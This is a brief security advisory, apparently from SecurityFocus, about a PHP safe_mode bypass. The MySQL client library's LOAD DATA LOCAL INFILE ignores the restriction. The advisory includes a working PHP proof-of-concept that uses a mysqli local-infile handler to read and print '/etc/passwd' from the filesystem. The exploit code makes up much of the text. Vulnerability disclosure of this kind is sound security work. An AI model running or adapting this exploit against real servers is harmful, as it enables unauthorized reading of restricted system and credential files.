source: http://www.securityfocus.com/bid/4026/info
 
PHP's 'safe_mode' feature may be used to restrict access to certain areas of a filesystem by PHP scripts. However, a problem has been discovered that may allow an attacker to bypass these restrictions to gain unauthorized access to areas of the filesystem that are restricted when PHP 'safe_mode' is enabled.
 
In particular, the MySQL client library that ships with PHP fails to properly honor 'safe_mode'. As a result, a user can issue a LOAD DATA statement to read files that reside in restricted areas of the filesystem (as determined by 'safe_mode').

<?php

function r($fp, &$buf, $len, &$err) {
      print fread($fp, $len);
}

$m = new mysqli('localhost', 'aaaa', '', 'a');
$m->options(MYSQLI_OPT_LOCAL_INFILE, 1);
$m->set_local_infile_handler("r");
$m->query("LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE a.a");
$m->close();

?>